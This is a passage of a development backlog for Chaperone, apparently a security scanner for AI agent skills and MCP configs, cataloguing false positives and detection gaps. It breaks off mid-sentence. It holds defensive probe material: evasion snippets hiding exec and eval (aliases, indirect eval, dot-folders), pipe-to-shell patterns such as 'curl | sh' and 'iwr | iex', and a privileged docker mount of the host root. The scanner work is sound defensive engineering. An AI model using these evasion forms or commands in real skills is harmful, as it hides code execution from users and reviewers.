# Chaperone — Proposed Fixes (post-0.2.1)

> **Complete.** Every batch below shipped in **0.6.0** (2026-10-04),
> except the Windows CI follow-up noted under Progress. Kept as the
> record of why each change was made; `DECISIONS.md` has the details.

A fresh backlog written on 2026-10-03, after every item in
`improvement_plan.md` (Phases 1-24) shipped in 0.2.0/0.2.1. That document
is now a historical record. This one starts from the current code.

**Method.** Every item below was found in one of two ways:

1. **Empirical probing.** I built the CLI and ran it against hand-written
   configs and skills designed to hit edge cases. Each probe is recorded
   in [Appendix A](#appendix-a--reproductions) so it can become a test
   fixture as-is.
2. **A line-by-line read** of every check, the discovery modules,
   `astCapabilities.ts`, the reporters, the engine, baseline, the plugin
   loader, and the fixer.

Items are tagged **[confirmed]** when a probe reproduced the problem,
and **[by inspection]** when it was found by reading code. Each item
also has an **Impact** and **Effort** tag (Low/Med/High).

---

## Progress

| Batch                              | Items                                             | Status                                                                                                  |
| ---------------------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| 0.2.2 — False-positive fixes       | 2.2, 2.4 (JS), 2.5, 2.6 (ESM half), 2.7, 2.8, 2.9 | ✅ Done on branch `fp-fixes-0.2.2` (see CHANGELOG `[0.2.2]`, DECISIONS.md)                              |
| 0.3.0 — Detection accuracy         | 2.1, 2.3, 3.1, 3.2, 3.3, 3.6, 3.7, 4.1, 4.2, 7.1  | ✅ Done on branch `detection-accuracy-0.3.0` (also the Python half of 2.4 and the per-call half of 2.6) |
| 0.4.0 — Real-world coverage        | 3.9, 6.1, 6.3, 3.4                                | ✅ Done on branch `real-world-coverage-0.4.0`                                                           |
| 0.5.0 — Supply chain + remediation | 3.5, 5, 4.3, 3.8                                  | ✅ Done on branch `supply-chain-remediation-0.5.0`                                                      |

Hygiene (4.4, 6.2, 7.2, 7.3, 7.4.x) is done on branch `hygiene`, with one
follow-up: the Windows CI job is non-blocking until the permission tests
assert the Windows behavior (see DECISIONS.md, 7.2). For 6.2, the
OpenClaw gateway keys are adapted; its channel and `tools.exec` policies
aren't modeled yet.

The two halves carried over from 0.2.2 (the Python half of 2.4 and the
per-call scoping redesign in 2.6) shipped with 0.3.0.

## Contents

- [0. Summary](#0-summary)
- [1. Current state](#1-current-state)
- [2. Correctness bugs](#2-correctness-bugs-wrong-results-today)
- [3. Detection gaps](#3-detection-gaps-false-negatives)
- [4. Reporting, CI integration, and scoring](#4-reporting-ci-integration-and-scoring)
- [5. Remediation (`chaperone fix`)](#5-remediation-chaperone-fix)
- [6. Strategic: real-world agent coverage](#6-strategic-real-world-agent-coverage)
- [7. Platform and repo hygiene](#7-platform-and-repo-hygiene)
- [8. Roadmap](#8-roadmap)
- [9. Definition of done and non-goals](#9-definition-of-done-and-non-goals)
- [Appendix A — Reproductions](#appendix-a--reproductions)

---

## 0. Summary

The codebase is healthy: clean build, 96.7% line coverage, no secret
leakage in any report format, and a well-documented decision trail.
**The problems are about detection accuracy on inputs the test fixtures
don't resemble.** The fixtures were written alongside the checks, so the
checks pass them. Realistic inputs expose the following.

The most serious findings, ranked:

| #   | Finding                                                                                                                                         | Kind           | Ref        |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------- | -------------- | ---------- |
| 1   | A skill can hide `execSync` + `eval` in a dot-folder (`.lib/`) and Chaperone reports nothing                                                    | Evasion        | §3.3       |
| 2   | `scan <path>` with a wrong/empty path exits **0** with grade **A** (90/100), so a CI typo passes green, contradicting the README                | Bug            | §2.1       |
| 3   | `execa`, `shelljs`, aliased `cp['exec']`, `(0, eval)`, `globalThis.eval`, `vm.runInNewContext`, and dynamic `require()` are all undetected      | False negative | §3.2       |
| 4   | `gateway.host: "127.0.0.1:8080"`, `"[::1]"`, and `"::ffff:127.0.0.1"` each raise a **critical** false positive                                  | False positive | §2.2       |
| 5   | 4 of 5 realistic secrets missed (bearer header, URL password, `ghp_`, `xoxb-`) because detection is key-name-only                               | False negative | §3.1       |
| 6   | Baseline mode is non-portable: the same install at a different path reports 42 of 44 findings as "new"                                          | Bug            | §2.7       |
| 7   | `res.send()` / `map.delete()` make a skill "destructive" (High); every skill with a `package.json` gets "no lockfile" (Medium)                  | False positive | §2.4, §2.5 |
| 8   | camelCase config keys (`autoExecuteLinks`, `markUntrustedInput`) are ignored, giving one false negative and two false positives                 | Bug            | §2.3       |
| 9   | A `chmod 777` skills directory (any local user can plant code the agent runs) is not flagged; `groupOrOtherWritable` is computed but never read | False negative | §3.6       |
| 10  | The offline vulnerability DB covers **2 packages** (lodash, minimist; 13 advisories), so `CHAP-SUP-003` is close to silent in practice          | False negative | §3.5       |
| 11  | The MCP profile discards server `command`/`args`/`url`, so shell, whole-disk, plaintext-HTTP, and privileged-container servers pass             | False negative | §3.9       |
| 12  | SARIF uses absolute `file://` URIs with no `partialFingerprints` or `security-severity`, which weakens GitHub code scanning                     | Integration    | §4.1       |
| 13  | The project's own Node floor (20) reached end-of-life on 2026-04-30                                                                             | Hygiene        | §7.1       |

---

## 1. Current state

### 1.1 What ships today (v0.2.1)

| Area          | State                                                                                                          |
| ------------- | -------------------------------------------------------------------------------------------------------------- |
| Checks        | 29 across 6 categories (secrets 7, agency 4, supply-chain 6, injection 5, network 3, observability 4)          |
| Reporters     | console, json, sarif, markdown, gha, html                                                                      |
| Commands      | `scan`, `checks`, `explain`, `fix`, `version`, `check-update`                                                  |
| Discovery     | default (Clawdbot-style) profile, `--profile mcp`, `--all` multi-root, `--docker`, sidecar secrets, memory dir |
| Skill scan    | TypeScript-compiler AST for `.js/.mjs/.cjs/.ts`; regex for `.py`; install scripts; offline vuln DB             |
| Config        | `.chaperonerc.json` (severity overrides, expiring ignores, disabled checks), `--baseline`, env-var flags       |
| Extensibility | `--plugin` API for third-party checks                                                                          |
| Remediation   | `chaperone fix` with one fixer (`CHAP-SEC-001`)                                                                |
| Size          | ~7,000 lines in `src/`, 6 runtime dependencies (`typescript` is one, used for the AST)                         |

### 1.2 Health (measured 2026-10-03)

- `npm ci`, `typecheck`, `lint`: clean. Tests: all passing.
- Coverage: **96.7% lines, 89.1% branches, 98.4% functions.** Weakest
  branch coverage is in `skillsScanner.ts` (79%) and `logging.ts` (80%).
- Fixture scan of `test/fixtures/vulnerable-agent`: 44 findings, matches
  the README.
- **No secret leakage**: a probe config holding realistic `sk-proj-…`,
  `ghp_…`, `AKIA…`, and URL passwords produced zero occurrences of those
  values in json/html/sarif/markdown output.
- CI: lint, format, typecheck (src + tests), `npm audit`, build,
  `CHECKS.md` drift check, packed-binary smoke test, coverage upload,
  non-blocking Stryker job. Releases use npm trusted publishing (OIDC).

### 1.3 Why the gaps exist

There's one recurring pattern: **each check was designed against a
fixture written for it.** The `vulnerable-agent` skills use exactly
`require('child_process').exec`, `path.join(__dirname, …)`, and
snake_case keys, so the checks recognize exactly those forms. The
largest single improvement is a corpus of adversarial and realistic
fixtures ([9.1](#91-definition-of-done-every-item)). They should be
written _before_ the fixes.

---

## 2. Correctness bugs (wrong results today)

### 2.1 Explicit path with no installation exits 0 and grades "A"

**[confirmed] Impact: High. Effort: Low.**

```text
$ chaperone scan ./does-not-exist   → exit 0, 2 findings, posture 90/100 (A)
$ chaperone scan ./empty-dir        → exit 0, 2 findings, posture 90/100 (A)
$ (cd empty-dir && chaperone scan)  → exit 1   (only the no-arg probe path fails)
```

The README says the scan "exits non-zero … when it couldn't locate an
installation to scan at all, so 'nothing was scanned' is never mistaken
for 'nothing was found'." That only holds for the no-argument case.
`resolveTargetRoot` returns `path.resolve(explicitPath)` without
checking existence, so `targetRootResolved` is `true` whenever a path is
given. A typo in a CI job's path therefore passes green forever.

The same root cause produces the two phantom findings: `CHAP-OBS-001`
and `CHAP-OBS-003` run against an empty model and report a missing audit
log and kill switch for an install that doesn't exist.

A related trap: passing the config file itself (`chaperone scan
~/clawd/config.yaml`), which is a natural thing to try, also resolves
to "no config found" and exits 0.

**Fix:**

- In `discoverAgent`, set `targetRootResolved: false` when the path
  doesn't exist, isn't a directory, or contains neither a config file
  nor a skills directory.
- If the path is a file whose basename is in `CONFIG_FILENAMES` (or an
  MCP filename), use its directory as the root and say so.
- Distinguish the two failure modes in the "Skipped" section ("path
  does not exist" vs. "no config.yaml/.yml/.json found").
- Never run checks against an unresolved model (they already don't for
  the no-arg case).

**Files:** `src/discovery/configLocator.ts`, `src/discovery/index.ts`,
`src/discovery/mcpProfile.ts`. **Tests:** extend
`test/cli.exitcode.test.ts` with nonexistent-path, empty-dir, and
file-as-target cases.

**Compatibility:** this can turn a currently-green CI job red. It's a
bug fix, but the CHANGELOG must call it out (see [8](#8-roadmap)).

### 2.2 `CHAP-NET-001` raises critical false positives on loopback forms

**[confirmed] Impact: High. Effort: Low.**

`isLoopbackAddress` (`src/checks/network/chapNet001GatewayExposed.ts`)
treats any host containing `:` as IPv6. The resulting **critical**
false positives:

| `gateway.host`     | Actual meaning          | Result         |
| ------------------ | ----------------------- | -------------- |
| `127.0.0.1:8080`   | loopback with port      | ❌ critical FP |
| `localhost:18789`  | loopback with port      | ❌ critical FP |
| `[::1]`            | bracketed IPv6 loopback | ❌ critical FP |
| `::ffff:127.0.0.1` | IPv4-mapped loopback    | ❌ critical FP |
| `127.0.0.2`        | loopback (127/8)        | ✅ correct     |

**Fix:** normalize before classifying. Strip `[…]` brackets, split off a
trailing `:port` (unambiguous only for IPv4/hostnames, or bracketed IPv6),
and unwrap `::ffff:` IPv4-mapped addresses. Then use `node:net`'s
`isIP()` for the address family and a `BlockList` for 127.0.0.0/8 and
::1. Also accept `localhost.` (trailing dot) and `ip6-localhost`.

Separately, a gateway with **no** `host` key is silently treated as
fine. Many servers default to `0.0.0.0` when no host is given, so emit
an `info` finding ("bind address not specified; verify the default")
rather than assuming either way.

**Files:** `chapNet001GatewayExposed.ts`, `src/discovery/gateway.ts`.
**Tests:** a table-driven test for every row above, plus a fast-check
property: for any IPv4 address in 127/8, with or without a port, the
result is loopback.

### 2.3 camelCase config keys are ignored in some checks

**[confirmed] Impact: Med–High. Effort: Low–Med.**

`logging.redactSecrets` accepts camelCase, but `configAccess.ts` and
`index.ts` read only snake_case for `trust.*`, `channels.*`,
`skills_dir`, and `memory_dir`. A JSON config written in camelCase
(the norm for JSON) gives:

```json
{ "trust": { "markUntrustedInput": true, "autoExecuteLinks": true, "toolAllowlist": ["search"] } }
```

- `CHAP-INJ-001`: false positive (the trust boundary _is_ set).
- `CHAP-INJ-003`: false positive (the allowlist _is_ set).
- `CHAP-INJ-004`: false negative (`autoExecuteLinks: true` is missed).
- `skillsDir: ./custom` is ignored, so Chaperone scans `./skills`
  instead and silently misses every skill.

**Fix:** one `getConfigField(record, 'snake_name')` helper that matches
snake_case, camelCase, and kebab-case spellings of the same key (reusing
`splitWordSegments`). Route every config read through it. Document the
accepted spellings once in `CHECKS.md`'s preamble.

**Files:** `src/checks/shared/configAccess.ts`, `src/discovery/index.ts`,
`src/discovery/memory.ts`, `src/discovery/logging.ts`,
`src/discovery/gateway.ts`. **Tests:** run the vulnerable fixture's
config through a snake→camel transform and assert an identical finding
set.

### 2.4 `CHAP-AGY-003` flags ordinary method calls as "destructive"

**[confirmed] Impact: High (noise). Effort: Med.**

`recordDestructive` in `astCapabilities.ts` matches the name of **every**
call and function declaration against `delete/send/remove/transfer/…`.
This harmless skill gets a **High** finding:

```js
const cache = new Map();
function handler(req, res) {
  cache.delete(req.id);
  res.send('ok');
}
```

`res.send`, `Map#delete`, `Set#delete`, `socket.send`, `URLSearchParams#delete`,
and `classList.remove` appear in most real code, so in practice this
check fires on nearly every skill. The Python path is worse: it matches
the keyword _anywhere in the source text_, including comments and
strings (`\bsend\b`).

**Fix:**

- Only count a keyword from an **exported** function/handler name (the
  skill's public surface, e.g. `deleteFile`, `sendPayment`) or from a
  call that resolves to a known-destructive API (`fs.rm`,
  `child_process` with `rm -rf`, a payments/email SDK method).
- Ignore member calls on receivers that aren't imports (`x.delete()`
  where `x` is a local `Map`/`Set`/array).
- For Python, use the same rule: `def` names at module level only.

**Files:** `src/discovery/astCapabilities.ts`,
`src/discovery/pythonCapabilities.ts`. **Tests:** add a `benign-web-skill`
fixture (express handler, Map cache) asserting zero `CHAP-AGY-003`.

### 2.5 `CHAP-SUP-002` fires on skills with no dependencies at all

**[confirmed] Impact: Med (noise). Effort: Low.**

The filter is `manifestPath !== null && lockfilePath === null`, but
`manifestPath` is set for any skill with a `package.json`, so a manifest
with no `dependencies` key still gets "declares dependencies but has no
lockfile." All four probe skills, none with dependencies, were flagged.

**Fix:** also require `dependencies.names.length > 0`. Consider counting
`optionalDependencies` too, and ignoring `devDependencies` since they
aren't installed at runtime. **Files:**
`chapSup002NoIntegrityVerification.ts`.

### 2.6 `CHAP-AGY-002` scoping heuristic: ESM false positive, and trivial to satisfy

**[confirmed] Impact: Med. Effort: Med.**

Two opposite problems with `fileSystemScoped`:

- **False positive (ESM):** only `path.join/resolve(__dirname, …)` counts
  as scoping. Modern ESM skills use `import.meta.dirname`,
  `import.meta.url` + `fileURLToPath`, or `new URL('./x', import.meta.url)`.
  The probe skill writing only to `path.join(import.meta.dirname, 'out',
name)` was flagged.
- **False negative (too easy):** any variable whose name contains
  `workspace`, `sandbox`, or `scoped` marks the _whole skill_ scoped,
  even `const workspaceRoot = '/'`. Because capabilities are OR-merged
  across files, one scoped call in any file clears unscoped writes in
  every other file.

**Fix:** decide scoping per write call, not per skill. A write is scoped
when its path argument traces (using the same bounded data-flow already
used for `dataFlowToShellExec`) to a `join/resolve` whose first argument
is `__dirname`, `import.meta.dirname`, a `fileURLToPath(import.meta.url)`
derivative, or a declared base-dir constant. A skill is unscoped if
_any_ write call is unscoped. Drop the variable-name heuristic, or keep
it only as a weak signal that downgrades severity.

**Files:** `astCapabilities.ts`, `model/types.ts` (see 4.2 for
per-call evidence).

### 2.7 Baseline fingerprints are non-portable and brittle

**[confirmed] Impact: High (for CI users). Effort: Low.**

`findingFingerprint` hashes `[checkId, absolute filePath, detail,
message]`. Copying the vulnerable fixture to a new directory and
scanning it against a baseline from the original location reported
**42 of 44 findings as new.** In practice:

- A baseline created locally (`/Users/me/clawd/…`) never matches in CI
  (`/home/runner/work/…`).
- Any message wording change in a new Chaperone version, or any
  message that embeds variable data (file mode, counts, package
  versions), resurfaces every finding.

**Fix:** fingerprint on `[checkId, path relative to targetRoot,
detail]`, plus a stable per-check discriminator where `detail` isn't
unique. Store `fingerprintVersion` in the JSON report. Keep a fallback
matcher for v0.2 baselines (absolute path, rebased against the old
report's `target`) so existing baselines don't all break at once. Use
the same fingerprint for SARIF `partialFingerprints` (4.1) and for
`.chaperonerc.json` `ignore` entries.

**Files:** `src/config/baseline.ts`, `src/reporters/json.ts`,
`src/reporters/schema.ts`. **Tests:** the copy-and-rescan probe from
Appendix A as a regression test.

### 2.8 Checks that read config keys run where those keys can't exist

**[confirmed] Impact: Med. Effort: Low.**

`CHAP-OBS-001` and `CHAP-OBS-003` fire on every `--profile mcp` scan and
on every no-config scan. MCP config files have no logging section, so
the finding describes something the format can't express. That lowers
the score for a setting the user cannot change.

**Fix:** add `appliesToProfiles?: DiscoveryProfile[]` to the `Check`
interface (`src/engine/types.ts`, default: all). Set `['default']` on
`CHAP-OBS-001/002/003` and `CHAP-INJ-001/003/004/005`. The engine
reports non-applicable checks under "not applicable to profile mcp",
the same way `--skip` is surfaced, so nothing is hidden silently.
`chaperone checks` and `CHECKS.md` gain a "Profiles" column.

### 2.9 `CHAP-AGY-001` ignores the declared confirmation gate

**[confirmed] Impact: Low–Med. Effort: Low (needs a decision).**

The message says "no detected command allowlist or confirmation gate",
but the check never reads `skill.confirmationRequired`. A skill
declaring `"confirmationRequired": true` still gets a **critical**.
`CHAP-AGY-003` does honor the same field. Either:

- (a) honor it and downgrade to `high` ("shell exec behind a declared
  confirmation gate: verify the gate is enforced"), or
- (b) keep `critical` and fix the message to not mention a gate.

Recommendation: (a). A declared gate is a real mitigation, and a
self-declared manifest flag deserves a downgrade but not silence.
Record the decision in `DECISIONS.md`.

---

## 3. Detection gaps (false negatives)

### 3.1 Secret detection is key-name-only, never value-based

**[confirmed] Impact: High. Effort: Med.**

`maskConfig`/`maskTree` (`src/discovery/configParser.ts`) treats a value
as a secret only if its key name contains a secret-shaped segment. The
value is never inspected. Probe result: **1 of 5** caught.

| Config line                                    | Caught?                 |
| ---------------------------------------------- | ----------------------- |
| `headers.Authorization: "Bearer sk-proj-…"`    | ❌                      |
| `base_url: "https://admin:hunter2pass@proxy…"` | ❌                      |
| `aws_access_key_id: AKIA…`                     | ✅ (name ends in `key`) |
| `github: ghp_…`                                | ❌                      |
| `auth: "xoxb-…"`                               | ❌                      |

**Second-order problem:** unrecognized secrets are never masked in
`model.config.data`. Reporters don't print `data`, so nothing leaks
today. But the plugin API passes the model to third-party code, so the
documented invariant "the real literal value is never retained anywhere
in the model" (`src/model/types.ts`) is already false.

**Fix:**

1. New `src/discovery/secretValuePatterns.ts` with anchored,
   high-precision patterns only. Each returns a name so the finding can
   say _why_:
   - provider prefixes: `sk-ant-`, `sk-proj-`, `sk-` (length floor),
     `ghp_/gho_/ghs_/ghu_/github_pat_`, `xox[abposr]-`,
     `AKIA|ASIA` + 16 uppercase alphanumerics, `AIza` + 35 chars,
     `glpat-`, `npm_`, `hf_`, `sk_live_/rk_live_`
   - `Bearer <token>` / `Basic <base64>`
   - PEM private-key headers
   - URL userinfo with a password (`scheme://user:pass@host`, not
     `user@host`, not when `pass` is an env reference)
2. Add `authorization`, `auth`, `bearer`, `cookie`, `session` to
   `SECRET_KEY_SEGMENTS`, flagged only for non-empty string values (so
   `auth: true` stays quiet).
3. A string is a secret if the key **or** the value matches. For URL
   credentials, mask only the password (`https://admin:***@proxy…`).
4. `SecretField` gains `detectedBy: 'key-name' | 'value-pattern'` and
   `pattern: string | null`. No new check ID; `CHAP-SEC-001`'s message
   distinguishes the cases.
5. Use the same detector for sidecar files (`CHAP-SEC-006`) and log
   scanning (`CHAP-SEC-005`), whose `KEY_VALUE_PATTERN` today only sees
   `key=value` lines, so a logged `Authorization: Bearer …` header
   passes.

No entropy-based detection: too noisy on hashes, UUIDs, and base64.

**Tests:** a per-pattern positive/near-miss table; a fast-check property
that a masked value never contains the original's middle; an assertion
that no value-shaped secret appears in `JSON.stringify(model)`;
`clean-agent` stays at zero.

### 3.2 AST capability detection misses common APIs and every indirection form

**[confirmed] Impact: High. Effort: Med.**

Literal element access (`cp['exec'](c)`) _is_ handled, but one level of
aliasing (`const run = cp['exec']; run(c)`) defeats it. None of these in
the probe skill triggered anything:

```js
const { execa } = require('execa');
await execa('sh', ['-c', cmd]);
const shell = require('shelljs');
shell.exec(cmd);
const cp = require('child_process');
const run = cp['exec'];
run(c);
(0, eval)(c);
globalThis.eval(c);
vm.runInNewContext(code);
fs.promises.writeFile(p, 'x');
require(cmd); // dynamic require
```

**Fix:** extend the module/function tables, and resolve three
indirection forms:

| Capability   | Add                                                                                                                                                                                 |
| ------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Shell        | `fork`; `execa`/`execaSync`/`$` (execa), `shelljs` (`exec`), `zx` (`$`), `cross-spawn`, `node-pty` (`spawn`), `Bun.spawn`, `Deno.Command`                                           |
| FS write     | `rename`, `copyFile`, `cp`, `mkdir`, `truncate`, `chmod`, `chown`, `symlink`, `createWriteStream`; `fs-extra` (`outputFile`, `remove`, `emptyDir`, `move`); `rimraf`, `del`         |
| Network      | `undici`, `got`, `ky`, `superagent`, `ws`, `net`, `tls`, `dgram`, `http2` (with `node:` variants); global `WebSocket`, `XMLHttpRequest`, `EventSource`                              |
| Dynamic code | `vm` (`runInNewContext`, `runInThisContext`, `Script`, `compileFunction`); `require(<non-literal>)`; `import(<non-literal>)`; `setTimeout/setInterval(<string>)`; `module._compile` |

Indirection forms to resolve:

- **Element access**: already handled for a direct call with a literal key (`mod['exec'](…)`); extend it to template-literal keys (``mod[`exec`]``),
  resolved the same way as `mod.exec`.
- **Nested namespaces**: `fs.promises.writeFile`, `require('fs').promises.x`.
- **Aliases**: `const run = cp.exec` / `cp['exec']`, followed one level.
- **Indirect eval**: `(0, eval)(…)`, `globalThis.eval`, `window.eval`,
  `global.eval`, `self['eval']`.

**Tests:** one fixture file per row with a positive and a negative
(e.g. a local function named `exec` that isn't from `child_process`).
Extend the existing AST fuzz test so arbitrary source never throws.

### 3.3 Skill-scanner blind spots allow trivial evasion

**[confirmed] Impact: Critical (evasion). Effort: Low–Med.**

`listSourceFiles` skips every entry starting with `.`. A skill whose
`index.js` does `require('./.lib/x')`, with `execSync` + `eval` inside
`.lib/x.js`, produced **zero** agency or obfuscation findings. Related
blind spots:

| Blind spot                                                    | Effect                                                                                              |
| ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| Dot-directories and dot-files skipped                         | Code hidden in `.lib/`, `.cache/`, `.hidden.js` is never analyzed                                   |
| `MAX_SCAN_DEPTH = 4`                                          | Code nested 5+ levels deep is invisible, and _not_ reported as skipped                              |
| Files > 256 KB are skipped (reported)                         | Minified/bundled payloads, the most common shape for obfuscated malware, are exactly what's skipped |
| Extensions: `.js/.mjs/.cjs/.ts/.py` only                      | `.jsx/.tsx/.mts/.cts` and extensionless `#!/usr/bin/env node` scripts are missed                    |
| Install-script scan reads only top-level `*.sh` and `README*` | `scripts/setup.sh` is missed; `README` "brew install jq" is a false positive                        |
| npm lifecycle hooks: `preinstall/install/postinstall` only    | `prepare` (runs on git installs) is missed                                                          |
| Pipe-to-shell patterns: `curl … \| sh`, `wget … \| sh`        | Missed: `bash <(curl …)`, `\| bash -s`, PowerShell `iwr … \| iex`, `base64 -d \| sh`                |

**Fix:**

- Scan dot-entries, except `.git` and a short explicit denylist.
- Don't skip at the depth limit silently: record a `skipped` entry
  ("directory too deep") so it shows in the report.
- For files over 256 KB, run a cheap streaming pre-pass instead of
  skipping: regex for `eval(`, `Function(`, `child_process`, `atob(`,
  and very long lines. Flag `dynamicEval` when it hits, with lower
  confidence.
- Add the extensions, and shebang detection for extensionless files.
- Scan `*.sh` recursively. Drop `apt-get install` / `brew install` from
  the "dangerous" list, or limit them to install scripts and exclude
  READMEs.
- Add `prepare` and the additional pipe-to-shell forms.

New fixture: `test/fixtures/evasive-agent/` covering each row.

### 3.4 Python detection is surface-level regex

**[by inspection] Impact: Med. Effort: Med.**

`pythonCapabilities.ts` misses `from subprocess import run`, `import
subprocess as sp`, `asyncio.create_subprocess_shell/exec`, `pty.spawn`,
`httpx`/`aiohttp`/`urllib3`, and unsafe deserialization (`pickle.loads`,
`yaml.load` without `SafeLoader`, `marshal.loads`). `\bexec\(` also
false-positives on `cursor.exec(`. Python dependencies
(`requirements.txt`, `pyproject.toml`, `Pipfile.lock`, `uv.lock`) are
never read, so `CHAP-SUP-002/003/006` are blind to Python skills.

**Fix (incremental):** an import-alias table built from `import x as y`
/ `from x import y` lines feeding the existing call patterns; skip
comment and string lines; parse `requirements.txt` and
`pyproject.toml` `[project.dependencies]` into `versionsByName`; treat
`requirements.txt` with `--hash=` lines, `poetry.lock`, or `uv.lock` as
the lockfile. A real Python parser is out of scope; document the
limitation.

### 3.5 The vulnerability database is too small to matter

**[confirmed] Impact: High. Effort: Med.**

`VULN_DB` has 13 advisories covering 2 packages (`lodash`, `minimist`).
`CHAP-SUP-003` also matches only **declared** specifiers (`^1.2.0` read
as its floor, `1.2.0`), not the versions actually installed. That gives
false positives when the lockfile resolved a patched version, and false
negatives for every transitive dependency.

**Fix, in order of value:**

1. **Read lockfiles** (`package-lock.json` v2/v3 `packages`, plus
   `pnpm-lock.yaml` and `yarn.lock` v1) for exact resolved versions,
   direct and transitive. Fall back to the specifier floor only when
   there's no lockfile, and say so in the message.
2. **Known-malicious versions** (new check, `CHAP-SUP-007`, Critical):
   seed from OSV `MAL-*` advisories (the OpenSSF malicious-packages
   feed) via the existing `refresh:vulndb` script. A compromised
   dependency version in a skill is the highest-signal supply-chain
   finding there is, and the data is small.
3. **Widen `TRACKED_PACKAGES`** to the packages agent skills commonly
   use: HTTP clients, `ws`, `express`, `tar`, `jsonwebtoken`,
   `follow-redirects`, `semver`, `undici`, `shelljs`, `simple-git`,
   `puppeteer`, `node-fetch`, `axios`. Aim for ~50–100.
4. **`--vuln-db <file>`**: accept a user-supplied OSV JSON export,
   letting organizations use the full database offline without
   bloating the package.
5. Print the DB's snapshot date in the report header so staleness is
   visible.

### 3.6 Write permissions are computed but never checked

**[confirmed] Impact: High. Effort: Low.**

`permissions.ts` computes `groupOrOtherWritable`, but no check reads it.
With `chmod 777 skills/`, any local user or process can drop in a skill
that the agent then executes with its full privileges. That's a local
privilege-escalation path, and it isn't reported. Permissions are also
only collected for files (config, log, memory, sidecars), never for the
target root or skills directory.

**Fix:** new check `CHAP-SEC-008` (High), "Agent files writable by other
users". It applies to the config file, the target root, the skills
directory and each skill directory, and the memory dir (where writable
means memory poisoning, a persistent prompt-injection vector). Collect
permission facts for those directories in `discovery/index.ts`. POSIX
only, with the same documented Windows caveat as `CHAP-SEC-003`.

### 3.7 Sidecar secret discovery covers five filenames

**[by inspection] Impact: Med. Effort: Low.**

Only `.env`, `.env.local`, `secrets.yaml/.yml/.json` are checked. Add
`.env.*` (`.env.production`, `.env.development`, …, excluding
`.env.example`/`.env.sample`/`.env.template`), `.envrc`, `.npmrc`
(`_authToken`), `.netrc`, `.pypirc`, `credentials.json`,
`service-account*.json`, and `*.pem`/`id_rsa`/`id_ed25519` in the target
root. For key files, presence plus permissions is enough; content is
never parsed beyond the masking pipeline.

### 3.8 Gateway auth: weak-token logic is narrow

**[by inspection] Impact: Low–Med. Effort: Low.**

`WEAK_TOKENS` is seven exact strings, so `abc`, `1234`, and `secret123`
pass. Add a minimum length (e.g. under 16 characters is weak) and treat
a token equal to any other configured secret as weak. Also consider
context: no auth on a loopback-only gateway is still worth reporting,
since browser-to-localhost and DNS-rebinding attacks exist, but it
shouldn't carry the same weight as no auth on `0.0.0.0`. Use a
`severityNote` to downgrade when `CHAP-NET-001` is clean.

### 3.9 MCP profile: server definitions are discarded

**[confirmed] Impact: High. Effort: Med–High.**

`mcpServerToSkill` throws away each server's `command`/`args`/`url`/`headers`
and hard-codes every capability to `false`. Probe `.mcp.json` with four
dangerous servers: only `CHAP-SUP-001` fired, plus the two inapplicable
observability checks (2.8).

| Server in probe                                              | Should map to                        |
| ------------------------------------------------------------ | ------------------------------------ |
| `"url": "http://mcp.example.com/sse"` (plaintext, non-local) | `CHAP-NET-003`, extended to MCP URLs |
| `"headers": {"Authorization": "Bearer sk-…"}`                | `CHAP-SEC-001` (fixed by 3.1)        |
| `bash -c "curl … \| sh"`                                     | `CHAP-AGY-001` + `CHAP-SUP-004`      |
| `server-filesystem /` (whole disk)                           | `CHAP-AGY-002`                       |
| `docker run --privileged -v /:/host`                         | new `CHAP-AGY-005`                   |

**Fix:**

1. Add an optional `launch` block to `Skill`:
   `{kind:'stdio', command, args, envKeys} | {kind:'remote', url, headerKeys}`.
   Key names only, never values.
2. Derive capabilities from it: a shell binary invoked with
   `-c`/`/c`/`-Command` sets `shellExec`; a known filesystem server
   rooted at `/`, `~`, `$HOME`, or a drive root sets unscoped
   `fileSystemAccess`; a remote server sets `networkAccess`.
3. Reuse `CHAP-AGY-001/002`, `CHAP-SUP-004` (with the same pipe-to-shell
   matcher as 3.3), and `CHAP-NET-003`.
4. New `CHAP-AGY-005` (Critical), "Container launched with host-level
   privileges": `--privileged`, `--cap-add=ALL`, `--pid=host`,
   `--network=host`, or a bind mount of `/`, `/var/run/docker.sock`, or
   `$HOME`. It also applies to `--docker` compose discovery, which is
   why it's an agency check and not an MCP-only one.

**Discovery breadth (same item):**

- Accept both `mcpServers` and `servers` top-level keys. VS Code's
  `.vscode/mcp.json` uses `servers` and is silently read as zero servers
  today.
- Probe `.vscode/mcp.json` and `.cursor/mcp.json` under the root.
- With no path, probe the global client locations: Claude Desktop
  (`~/Library/Application Support/Claude/…` on macOS, `%APPDATA%\Claude\…`
  on Windows), `~/.cursor/mcp.json`, and `~/.claude.json`.
- A config that parses but yields zero servers is reported as
  "nothing scanned", not as a clean pass (consistent with 2.1).

---

## 4. Reporting, CI integration, and scoring

### 4.1 SARIF output is weak for GitHub code scanning

**[confirmed] Impact: Med–High. Effort: Low.**

`src/reporters/sarif.ts`:

- **Absolute `file://` URIs** (`file:///home/runner/work/…`). Code
  scanning maps results to repository-relative paths. Absolute paths
  are non-portable and also leak the local username and home layout
  when a SARIF file is shared. **Fix:** emit paths relative to the scan
  target with `uriBaseId: "SRCROOT"`, and declare
  `originalUriBaseIds.SRCROOT` in the run.
- **No `partialFingerprints`**, so GitHub can't track an alert across
  runs; moved lines re-open or duplicate alerts. **Fix:** emit the
  stable fingerprint from 2.7.
- **No `security-severity`.** GitHub derives the Critical/High/Medium/Low
  security severity shown in the UI from
  `rules[].properties["security-severity"]` (a 0.0–10.0 string).
  Without it, findings appear as generic errors/warnings. **Fix:**
  critical 9.5, high 8.0, medium 5.5, low 3.0; add `tags: ["security"]`.
- **Rules carry only the title** (`fullDescription = title`). The rich
  `detects`/`heuristic`/`remediation` text behind `chaperone explain`
  never reaches SARIF. **Fix:** populate `fullDescription`,
  `help.text`/`help.markdown`, and `helpUri` (anchor into `CHECKS.md`).
  Emit rules for every check _run_, not only those that fired, so
  "fixed" alerts close correctly.
- Add `invocations[0].executionSuccessful` and the skipped-path count,
  so a failed or partial scan is visible in SARIF.

**Tests:** validate output against the SARIF 2.1.0 JSON schema (vendored
into `test/`, so no network) in the snapshot suite.

### 4.2 Skill findings point at the manifest, not the evidence

**[by inspection] Impact: Med. Effort: Med.**

Only `CHAP-SEC-001` and `CHAP-SEC-007` populate `location.line`. All
